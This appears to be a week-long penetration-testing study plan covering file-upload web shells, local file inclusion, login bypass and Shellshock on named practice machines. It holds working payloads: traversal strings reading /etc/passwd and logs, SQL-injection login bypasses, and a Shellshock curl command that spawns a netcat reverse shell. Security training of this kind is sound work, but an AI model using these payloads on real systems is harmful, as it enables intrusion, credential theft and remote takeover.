# 🌐 Week 6: Web Exploitation I — File Uploads, LFI, Auth Bypass

> _"Web apps are where the users are. And where the users are... the bugs are."_  
> This week is all about breaking into web servers through **upload vulnerabilities**, **directory traversal**, and **authentication logic flaws**.

---

## 🎯 Objectives
- Identify and exploit **file upload vulnerabilities**
- Exploit **LFI (Local File Inclusion)** and **directory traversal**
- Bypass **login forms**, exploit logic bugs or use common bypass tricks
- Practice chaining recon + web enumeration into real shells
- Learn how to identify weak or default configurations in HTTP services

---

## 🛠 Tools to Master

|Tool|Purpose|
|---|---|
|`ffuf`, `gobuster`|Directory fuzzing|
|`burpsuite`|Manual web request manipulation|
|`whatweb`, `wappalyzer`|Web tech fingerprinting|
|`curl`, `wget`|Pull files and test endpoints|
|`php-reverse-shell.php`|Common reverse shell payload|
|`nc`, `python3 -m http.server`|Listener & hosting payloads|

---

## 💻 Capstone Machines

|Machine|Concepts Covered|
|---|---|
|**Shocker**|Exploit CGI for RCE|
|**Nineveh**|File upload vulnerability & bypass|
|**Traverxec**|LFI and misconfigured HTTP server|

## 🗓️ Daily Breakdown

---

### 📅 Monday – Web Server Enumeration

#### ✅ Objectives:
- Use automated and manual tools to fingerprint HTTP services
- Fuzz for directories, admin panels, upload points
#### 🔧 Tasks:

```bash
whatweb http://<IP>
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
curl -I http://<IP>

```

- Use `burpsuite` to intercept logins or POST forms
- Look for admin panels, login pages, dev endpoints
#### 📄 Deliverables:
- `web-recon.md` with a summary of target’s web layout

---

### 📅 Tuesday – File Upload Exploits

#### ✅ Objectives:
- Find upload forms and test extension filtering
- Upload web shell (PHP, ASPX)
#### 🔧 Tasks:
- Try uploading:
    - `shell.php`
    - `shell.php.jpg`
    - `shell.phtml`
- Bypass content-type checks in Burp if needed
- Trigger shell with:

```bash
http://<IP>/uploads/shell.php?cmd=id
```

- Set up listener:

```bash
nc -lvnp 4444
```

#### 📄 Deliverables:
- Screenshot of web shell trigger + reverse shell
- Notes on how the bypass worked

---

### 📅 Wednesday – Local File Inclusion (LFI)

#### ✅ Objectives:
- Identify pages that use `?file=` or `?page=`
- Exploit path traversal to read sensitive files
#### 🔧 Tasks:
- Try payloads like:

```perl
http://<IP>/?page=../../../../etc/passwd
http://<IP>/?file=../../../../../../var/log/apache2/access.log
```

- Use LFI to:
    - View logs
    - Inject PHP via log poisoning (if possible)
    - Read credentials/config files
#### 📄 Deliverables:
- Proof of file reads
- Report on what was accessible

---

### 📅 Thursday – Authentication Bypass Techniques

#### ✅ Objectives:
- Practice logic flaws and form tampering
#### 🔧 Tasks:
- Try common payloads:
    - `' OR '1'='1`
    - `' OR 1=1--`
    - `admin'--`
- Use Burp to:
    - Replay POST requests
    - Remove headers (like X-Forwarded-For)
    - Bypass client-side restrictions
- Look for:
    - Default creds (admin/admin)
    - Passwords in JavaScript or comments
    - Login rate limiting
#### 📄 Deliverables:
- Successful bypass proof
- Explanation of how it worked

---

### 📅 Friday – Root Shocker

#### ✅ Objectives:
- Exploit CGI scripts vulnerable to Shellshock
#### 🔧 Tasks:
- Fuzz `/cgi-bin/`:

```bash
gobuster dir -u http://<IP>/cgi-bin/ -w common-cgi.txt
```

- Craft payload in Burp or `curl`:

```bash
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "nc <IP> 4444 -e /bin/bash"' http://<IP>/cgi-bin/status
```

- Catch shell with `nc`
#### 📄 Deliverables:
- `shocker-report.md` with payloads and shell output

---

### 📅 Saturday – Root Nineveh & Traverxec

#### ✅ Objectives:
- Apply upload and LFI techniques in real-world boxes
#### 🔧 Tasks:
- Nineveh:
    - Upload shell via web UI
    - Bypass validation
- Traverxec:
    - Exploit LFI to read sensitive files
    - Use `user.txt` and privesc via config
#### 📄 Deliverables:
- `nineveh-report.md`
- `traverxec-report.md`

---

### 📅 Sunday – Weekly Review + Web Cheatsheet

#### ✅ Objectives:
- Build reusable web attack checklist
- Reflect on weaknesses and solidify knowledge
#### 🔧 Tasks:
- Create:
    - `web-cheatsheet.md` (upload bypasses, LFI payloads, common creds)
    - `notes.md`
    - Update `ego-log.md`

---
